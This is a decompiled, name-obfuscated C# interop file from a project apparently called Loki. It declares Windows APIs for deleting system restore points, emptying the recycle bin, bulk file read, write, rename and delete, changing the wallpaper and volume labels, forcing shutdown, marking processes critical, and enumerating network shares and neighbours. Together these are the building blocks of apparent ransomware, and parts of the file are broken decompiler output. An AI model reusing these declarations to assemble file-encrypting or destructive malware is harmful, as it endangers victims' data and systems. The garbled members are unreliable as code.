using System;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security;
using System.Text;
using Microsoft.Win32.SafeHandles;

namespace Loki.Pinvoke;

internal class ZZZZS
{
	public enum ZZZZZZJ
	{
		ERROR_SUCCESS = 0,
		S_OK = 0
	}

	public struct ZZZZZZK
	{
		public int ZZZZZZL;

		public int ZZZZZZM;

		public int ZZZZZZN;

		public int ZZZZZZO;
	}

	public enum ZZZZZZP
	{
		Tiled,
		Centered,
		Stretched
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct ZZZZZZQ
	{
		public uint ZZZZZZR;

		public FILETIME ZZZZZZS;

		public FILETIME ZZZZZZT;

		public FILETIME ZZZZZZU;

		public uint ZZZZZZV;

		public uint ZZZZZZW;

		public uint ZZZZZZX;

		public uint ZZZZZZY;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string ZZZZZZZ;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
		public string ZZZZZZZa;
	}

	public struct ZZZZZZZb
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 16)]
		public string ZZZZZZZc;
	}

	public struct ZZZZZZZd
	{
		public IntPtr ZZZZZZZe;

		public ZZZZZZZb ZZZZZZZf;

		public ZZZZZZZb ZZZZZZZg;

		public int ZZZZZZZh;
	}

	public struct ZZZZZZZi
	{
		public IntPtr ZZZZZZZj;

		public int ZZZZZZZk;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string ZZZZZZZl;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 132)]
		public string ZZZZZZZm;

		public uint ZZZZZZZn;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] ZZZZZZZo;

		public int ZZZZZZZp;

		public uint ZZZZZZZq;

		public uint ZZZZZZZr;

		public IntPtr ZZZZZZZs;

		public ZZZZZZZd ZZZZZZZt;

		public ZZZZZZZd ZZZZZZZu;

		public ZZZZZZZd ZZZZZZZv;

		public bool ZZZZZZZw;

		public ZZZZZZZd ZZZZZZZx;

		public ZZZZZZZd ZZZZZZZy;

		public int ZZZZZZZz;

		public int ZZZZZZZA;
	}

	public enum ZZZZZZZB
	{
		RESOURCE_CONNECTED = 1,
		RESOURCE_GLOBALNET,
		RESOURCE_REMEMBERED,
		RESOURCE_RECENT,
		RESOURCE_CONTEXT
	}

	public enum ZZZZZZZC
	{
		RESOURCETYPE_ANY,
		RESOURCETYPE_DISK,
		RESOURCETYPE_PRINT,
		RESOURCETYPE_RESERVED
	}

	public enum ZZZZZZZD
	{
		RESOURCEUSAGE_CONNECTABLE = 1,
		RESOURCEUSAGE_CONTAINER = 2,
		RESOURCEUSAGE_NOLOCALDEVICE = 4,
		RESOURCEUSAGE_SIBLING = 8,
		RESOURCEUSAGE_ATTACHED = 16,
		RESOURCEUSAGE_ALL = 19
	}

	public enum ZZZZZZZE
	{
		RESOURCEDISPLAYTYPE_GENERIC,
		RESOURCEDISPLAYTYPE_DOMAIN,
		RESOURCEDISPLAYTYPE_SERVER,
		RESOURCEDISPLAYTYPE_SHARE,
		RESOURCEDISPLAYTYPE_FILE,
		RESOURCEDISPLAYTYPE_GROUP,
		RESOURCEDISPLAYTYPE_NETWORK,
		RESOURCEDISPLAYTYPE_ROOT,
		RESOURCEDISPLAYTYPE_SHAREADMIN,
		RESOURCEDISPLAYTYPE_DIRECTORY,
		RESOURCEDISPLAYTYPE_TREE,
		RESOURCEDISPLAYTYPE_NDSCONTAINER
	}

	[StructLayout(LayoutKind.Sequential)]
	public class ZZZZZZZF
	{
		public ZZZZZZZB ZZZZZZZG;

		public ZZZZZZZC ZZZZZZZH;

		public ZZZZZZZE ZZZZZZZI;

		public ZZZZZZZD ZZZZZZZJ;

		public string ZZZZZZZK;

		public string ZZZZZZZL;

		public string ZZZZZZZM;

		public string ZZZZZZZN;

		public extern ZZZZZZZF();
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZZZZZZZO
	{
		public string ZZZZZZZQ;

		public uint ZZZZZZZR;

		public string ZZZZZZZS;

		public ZZZZZZZO(string sharename, uint sharetype, string remark)
		{
			//Discarded unreachable code: IL_0005, IL_000d, IL_0012, IL_0018, IL_001e, IL_0023, IL_002c
			//IL_0005: Unsupported input type for neg.
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected I, but got Unknown
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			/*Error: Invalid metadata token*/;
		}

		public override string ZZZZZZZP()
		{
			//Discarded unreachable code: IL_0001, IL_0008, IL_0009
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			/*Error: Unknown opcode: 0xFD*/;
		}
	}

	public enum ZZZZZZZT : uint
	{
		NERR_Success = 0u,
		NERR_BASE = 2100u,
		NERR_UnknownDevDir = 2116u,
		NERR_DuplicateShare = 2118u,
		NERR_BufTooSmall = 2123u
	}

	public enum ZZZZZZZU : uint
	{
		STYPE_DISKTREE = 0u,
		STYPE_PRINTQ = 1u,
		STYPE_DEVICE = 2u,
		STYPE_IPC = 3u,
		STYPE_SPECIAL = 2147483648u
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public class ZZZZZZZV
	{
		public uint ZZZZZZZW;

		public uint ZZZZZZZX;

		public ulong ZZZZZZZY;

		public ulong ZZZZZZZZ;

		public ulong ZZZZZZZZa;

		public ulong ZZZZZZZZb;

		public ulong ZZZZZZZZc;

		public ulong ZZZZZZZZd;

		public ulong ZZZZZZZZe;

		public extern ZZZZZZZV();
	}

	public class ZZZZZZZZf : SafeHandleZeroOrMinusOneIsInvalid
	{
		private extern ZZZZZZZZf();

		public extern ZZZZZZZZf(IntPtr preexistingHandle, bool ownsHandle);

		protected override extern bool ZZZZZZZZg();
	}

	public const int ZZZZZZc = 20;

	public const int ZZZZZZd = 1;

	public const int ZZZZZZe = 2;

	public const int ZZZZZZf = 1;

	public const int ZZZZZZg = 2;

	public const int ZZZZZZh = 4;

	public static readonly IntPtr ZZZZZZi;

	public const uint ZZZZZZj = 1u;

	public const uint ZZZZZZk = 8u;

	public const uint ZZZZZZl = 64u;

	public const uint ZZZZZZm = 16u;

	public const uint ZZZZZZn = 4u;

	public const int ZZZZZZo = 0;

	public const int ZZZZZZp = 1;

	public const int ZZZZZZq = 3;

	public const int ZZZZZZr = 4;

	public const short ZZZZZZs = 0;

	public const short ZZZZZZt = 21;

	public const short ZZZZZZu = 70;

	public const short ZZZZZZv = 80;

	public const short ZZZZZZw = 443;

	public const short ZZZZZZx = 1080;

	public const int ZZZZZZy = 1;

	public const int ZZZZZZz = 2;

	public const int ZZZZZZA = 3;

	public const uint ZZZZZZB = uint.MaxValue;

	private const int ZZZZZZC = 8;

	private const int ZZZZZZD = 128;

	private const int ZZZZZZE = 256;

	public const int ZZZZZZF = 111;

	public const uint ZZZZZZG = uint.MaxValue;

	private const int ZZZZZZH = 0;

	public const int ZZZZZZI = 13369376;

	[DllImport("SrClient.dll", SetLastError = true)]
	public static extern uint SRRemoveRestorePoint(uint uint_0);

	[DllImport("Kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern bool SetVolumeLabelA(string string_0, string string_1);

	[DllImport("user32.dll")]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool GetWindowRect(IntPtr intptr_0, out ZZZZZZK zzzzzzk_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern bool SystemParametersInfo(int int_0, int int_1, string string_0, int int_2);

	[DllImport("shell32.dll")]
	public static extern int SHEmptyRecycleBin(IntPtr intptr_0, string string_0, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr FindFirstFile(string string_0, out ZZZZZZQ zzzzzzq_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern bool FindNextFile(IntPtr intptr_0, out ZZZZZZQ zzzzzzq_0);

	[DllImport("kernel32.dll")]
	public static extern bool FindClose(IntPtr intptr_0);

	[DllImport("Shlwapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr PathFindExtensionW(string string_0);

	[DllImport("Shlwapi.dll", CharSet = CharSet.Unicode)]
	public static extern IntPtr PathFindFileNameW(string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.U4)] FileAccess fileAccess_0, [MarshalAs(UnmanagedType.U4)] FileShare fileShare_0, IntPtr intptr_0, [MarshalAs(UnmanagedType.U4)] FileMode fileMode_0, [MarshalAs(UnmanagedType.U4)] FileAttributes fileAttributes_0, IntPtr intptr_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool GetFileSizeEx(IntPtr intptr_0, out long long_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, out uint uint_1, IntPtr intptr_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
	[SuppressUnmanagedCodeSecurity]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string string_0);

	[DllImport("kernel32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteFile(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, out uint uint_1, IntPtr intptr_2);

	[DllImport("kernel32.dll", EntryPoint = "WriteFile")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteFile_1(IntPtr intptr_0, byte[] byte_0, uint uint_0, out uint uint_1, IntPtr intptr_1);

	[DllImport("kernel32.dll")]
	public static extern bool SetFilePointerEx(IntPtr intptr_0, long long_0, IntPtr intptr_1, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool MoveFileW(string string_0, string string_1);

	[DllImport("kernel32.dll")]
	public static extern long GetVolumeInformation(string string_0, StringBuilder stringBuilder_0, uint uint_0, ref uint uint_1, ref uint uint_2, ref uint uint_3, StringBuilder stringBuilder_1, uint uint_4);

	[DllImport("shlwapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool PathFileExistsW([MarshalAs(UnmanagedType.LPTStr)] string string_0);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern uint InitiateShutdown(string string_0, string string_1, uint uint_0, uint uint_1, uint uint_2);

	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string string_0, IntPtr intptr_0, IntPtr intptr_1, int int_0, uint uint_0, IntPtr intptr_2);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int MessageBox(IntPtr intptr_0, string string_0, string string_1, uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern uint GetFileAttributesW(string string_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern uint GetModuleFileName([In] IntPtr intptr_0, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr InternetOpen(string string_0, int int_0, string string_1, string string_2, int int_1);

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr InternetConnect(IntPtr intptr_0, string string_0, short short_0, string string_1, string string_2, int int_0, int int_1, IntPtr intptr_1);

	[DllImport("wininet.dll", SetLastError = true)]
	public static extern IntPtr HttpOpenRequest(IntPtr intptr_0, string string_0, string string_1, string string_2, string string_3, string[] string_4, int int_0, IntPtr intptr_1);

	[DllImport("wininet.dll", SetLastError = true)]
	public static extern bool HttpSendRequest([In] IntPtr intptr_0, [In] string string_0, [In] uint uint_0, [In] IntPtr intptr_1, [In] uint uint_1);

	[DllImport("wininet.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InternetReadFile(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, out uint uint_1);

	[DllImport("wininet.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InternetCloseHandle(IntPtr intptr_0);

	[DllImport("Kernel32.dll")]
	public static extern bool QueryFullProcessImageName([In] IntPtr intptr_0, [In] uint uint_0, [Out] StringBuilder stringBuilder_0, [In][Out] ref uint uint_1);

	[DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CreateThread(IntPtr intptr_0, uint uint_0, Action action_0, IntPtr intptr_1, uint uint_1, out uint uint_2);

	[DllImport("kernel32.dll")]
	public static extern uint WaitForMultipleObjects(uint uint_0, IntPtr[] intptr_0, bool bool_0, uint uint_1);

	[DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr ShellExecute(IntPtr intptr_0, string string_0, string string_1, string string_2, string string_3, int int_0);

	[DllImport("iphlpapi.dll", CharSet = CharSet.Ansi)]
	public static extern int GetAdaptersInfo(IntPtr intptr_0, ref long long_0);

	[DllImport("iphlpapi.dll", ExactSpelling = true)]
	public static extern int SendARP(uint uint_0, uint uint_1, byte[] byte_0, ref int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern uint WaitForSingleObject(IntPtr intptr_0, uint uint_0);

	[DllImport("mpr.dll")]
	public static extern int WNetAddConnection2(ZZZZZZZF zzzzzzzf_0, string string_0, string string_1, int int_0);

	[DllImport("Netapi32.dll", SetLastError = true)]
	public static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	public static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	[DllImport("mpr.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int WNetGetConnection([MarshalAs(UnmanagedType.LPTStr)] string string_0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, ref int int_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GlobalMemoryStatusEx([In][Out] ZZZZZZZV zzzzzzzv_0);

	[DllImport("shell32.dll")]
	public static extern void SHChangeNotify(int int_0, uint uint_0, IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)] string string_0);

	[DllImport("gdi32.dll")]
	public static extern bool BitBlt(IntPtr intptr_0, int int_0, int int_1, int int_2, int int_3, IntPtr intptr_1, int int_4, int int_5, int int_6);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleBitmap(IntPtr intptr_0, int int_0, int int_1);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleDC(IntPtr intptr_0);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr intptr_0);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteObject(IntPtr intptr_0);

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowDC(IntPtr intptr_0);

	[DllImport("user32.dll")]
	public static extern IntPtr ReleaseDC(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern ZZZZZZZZf FindFirstVolume([Out] StringBuilder stringBuilder_0, uint uint_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool FindNextVolume(ZZZZZZZZf zzzzzzzzf_0, [Out] StringBuilder stringBuilder_0, uint uint_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool FindVolumeClose(IntPtr intptr_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool GetVolumeNameForVolumeMountPointW(string string_0, [Out] StringBuilder stringBuilder_0, uint uint_0);

	[DllImport("kernel32.dll")]
	public static extern bool SetVolumeMountPoint(string string_0, string string_1);

	public extern ZZZZS();
}
